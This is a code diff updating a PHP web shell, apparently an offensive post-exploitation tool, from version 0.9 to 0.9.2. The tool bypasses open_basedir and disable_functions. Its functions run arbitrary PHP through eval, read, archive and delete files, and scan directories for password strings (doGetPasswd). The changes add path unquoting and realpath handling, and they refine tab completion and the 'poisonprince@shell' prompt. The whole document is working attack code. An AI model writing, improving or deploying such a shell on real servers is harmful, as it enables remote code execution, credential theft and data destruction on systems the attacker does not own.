@@ -4,7 +4,7 @@
  * and disable_functions
  * 
  * @author  Testeur de Stylos
- * @version 0.9
+ * @version 0.9.2
  */
 ob_end_clean();
 
@@ -466,6 +466,18 @@ else{
   $functions['ini_get'] = function($x){return ini_get($x);};
 }
 
+/**
+ * Removes surrounding quotes around a value (generally a path)
+ * $path: The path to unquote
+ * return: The original value if not surrounded by quotes, or the unquoted path
+ */
+function unquotePath(string $path ):string{
+  $fchar = $path[0];
+  if (($fchar == '"' || $fchar == "'") && $path[strlen($path)-1] == $fchar){
+    return substr($path, 1, -1);
+  }
+  return $path;
+}
 //https://stackoverflow.com/questions/4356289/php-random-string-generator
 function generateRandomString($length = 10) {
   return substr(str_shuffle(str_repeat($x='0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ', ceil($length/strlen($x)) )),1,$length);
@@ -588,10 +600,7 @@ function getArgs(string $operands): array {
       $m = str_replace("\\'", "'", $match);
       $m = str_replace('\\"', '"', $m);
       $m = str_replace('\\\\', '\\', $m);
-      if (str_starts_with($m, "'") || str_starts_with($m, '"')){
-        $m = substr($m, 1, -1);
-      }
-      array_push($res, $m);
+      array_push($res, unquotePath($m));
     }
     return $res;
   }
@@ -816,6 +825,7 @@ function walk_dir_2(string $dir, array &$results = array()):string{
 * return: The file content or error message
 **/
 function doCat(string $path): string{
+  $path = unquotePath($path);
   if (is_file($path)){
     $content = file_get_contents($path);
     if ($content) {return $content;}
@@ -829,6 +839,7 @@ function doCat(string $path): string{
 * return: Empty string if success, error message otherwise
 **/
 function doCd(string $path):string {
+  $path = unquotePath($path);
   if (!strlen($path)){
     $path = getenv("HOME");
     if ($path === false){ return "Error, HOME env variable is not set"; }
@@ -1031,10 +1042,11 @@ function doEnv():string{
 * return: The PHP output
 **/
 function doEval(string $code):string{
+  $code = unquotePath($code);
   set_error_handler(function($_errno, $errstr) {
     // Convert notice, warning, etc. to error.
     throw new Error($errstr);
-});
+  });
   ob_start();
   try {
     eval($code);
@@ -1101,7 +1113,9 @@ function doGetPasswd(string $path):string{
   if (!strlen($path)){
     $path = getcwd();
   }
-
+  else{
+    $path = realpath(unquotePath($path));
+  }
   $files = walk_dir($path);
   if (!$files){
     return "Access to directory $path is denied";
@@ -1120,8 +1134,9 @@ function doGetPasswd(string $path):string{
             foreach ($matches[0] as $match) {
               $line = htmlspecialchars($match);
               array_push($results,
-                "<span style='color:purple;'>$shortpath</span>: ".preg_replace("/($needle\w*)/mi", '<span style="color:red;">$1</span>', $line));
+                "<span style='color:purple;'>$shortpath</span>: ".preg_replace("/((".implode("|", NEEDLE_PASSWDS).")\w*)/mi", '<span style="color:red;">$1</span>', $line));
             }
+            break;
           }
         }
       }
@@ -1266,26 +1281,27 @@ function doLs(string $path): string {
     $path = getcwd();
     $recursive = true;
   }
-  if (file_exists($path)){
-    if (is_dir($path)) {
-      if (!str_ends_with($path, "/")){
-        $path .= "/";
+  $realpath = realpath(unquotePath($path));
+  if (file_exists($realpath)){
+    if (is_dir($realpath)) {
+      if (!str_ends_with($realpath, "/")){
+        $realpath .= "/";
       }
 
       $finfos = [];
       if (!$recursive){
-        $list_dir = scandir($path, SCANDIR_SORT_ASCENDING);
+        $list_dir = scandir($realpath, SCANDIR_SORT_ASCENDING);
         foreach ($list_dir as $xfile) {
-          array_push($finfos, get_finfo($path.$xfile));
+          array_push($finfos, get_finfo($realpath.$xfile));
         }
         return format_ls($finfos);
       }
       else{
-        return walk_dir_2($path);
+        return walk_dir_2($realpath);
       }
     }
     else {
-      return implode(" ", get_finfo($path, true));
+      return implode(" ", get_finfo($realpath, true));
     }
   }
   else {
@@ -1300,6 +1316,7 @@ function doLs(string $path): string {
 **/
 function doMkdir(string $path): string {
   if (!strlen($path)) {return "Error, empty name"; }
+  $path = unquotePath($path);
   while (strpos($path, "//") !== false){
     $path = str_replace("//", "/", $path);
   }
@@ -1386,6 +1403,7 @@ function doPs(): string{
 * return: Success or error message
 **/
 function doRm(string $path):string{
+  $path = unquotePath($path);
   if (file_exists($path)){
     if (is_file($path)){
       if (unlink($path)){ return "File $path deleted";}
@@ -1406,7 +1424,8 @@ function doRm(string $path):string{
 **/
 function doTar(string $path):array{
   if(!strlen($path)){$path = getcwd();}
-  elseif (!file_exists($path)){
+  else{$path = unquotePath($path);}
+  if (!file_exists($path)){
     return featureDownload($path); //let is miserably fail, on purpose
   }
   $archname = generateRandomString().".tar";
@@ -1562,29 +1581,33 @@ function featureHint(string $fileName, string $cwd, string $type):array {
   bypass_openbasedir($cwd);
   $match_scan_dir = [];
   $idx = strrpos($fileName, "/");
-  if (!strlen($fileName)) {
+  if ($idx === false || !strlen($fileName)){
     foreach (scandir(".", SCANDIR_SORT_ASCENDING) as $x){
-      array_push($match_scan_dir, $x);
+      if (str_starts_with($x, $fileName) || !strlen($fileName) && strcmp(".", $x) && strcmp("..", $x)){
+        if (is_dir($x)){$x .= "/"; }
+        array_push($match_scan_dir, $x);
+      }
     }
   }
-  else {
-    if ($idx === false ){
-      $path = "./";
-      $fileName = "./$fileName";
+  else{
+    $dir = substr($fileName, 0, $idx);
+    if (!strlen($dir)) $dir = "/"; //root
+    $path = realpath($dir);
+    if (!file_exists($path)){
+      return array(
+        'files' => []
+      );
     }
-    else{
-      $path = substr($fileName, 0, $idx+1);
-    }
-    $res_scandir = scandir($path, SCANDIR_SORT_ASCENDING);
-    if ($res_scandir === false){
-      return array('files' => []);
-    }
-    foreach ($res_scandir as $x){
-      if (str_starts_with($path.$x, $fileName) && strcmp(".", $x) && strcmp("..", $x)){
-        $filepath = $path.$x;
-        if (is_dir($filepath)){$filepath .= "/"; }
-        array_push($match_scan_dir, $filepath);
+    $fileName_local = substr($fileName, $idx+1);
+    foreach (scandir($path, SCANDIR_SORT_ASCENDING) as $x){
+      if (str_starts_with($x, $fileName_local) || !strlen($fileName_local) && strcmp(".", $x) && strcmp("..", $x)){
+        if (is_dir($dir."/".$x)){$x .= "/";}
+        array_push($match_scan_dir, $x);
       }
+    }
+    //otherwise it is likely that only .. will match and therefore take over the input
+    if (count($match_scan_dir) == 1){
+      $match_scan_dir[0] = ($dir != "/" ? $dir."" : "")."/".$match_scan_dir[0];
     }
   }
   return array(
@@ -1925,9 +1948,9 @@ if (isset($_GET["feature"])) {
             function genPrompt(cwd) {
                 cwd = cwd || "~";
                 var shortCwd = cwd;
-                if (cwd.split("/").length > 3) {
+                if (cwd.split("/").length > 4) {
                     var splittedCwd = cwd.split("/");
-                    shortCwd = "…/" + splittedCwd[splittedCwd.length-2] + "/" + splittedCwd[splittedCwd.length-1];
+                    shortCwd = "…/" + splittedCwd[splittedCwd.length-3] + "/" + splittedCwd[splittedCwd.length-2] + "/" + splittedCwd[splittedCwd.length-1];
                 }
                 return "poisonprince@shell:<span title=\"" + cwd + "\">" + shortCwd + "</span>#";
             }
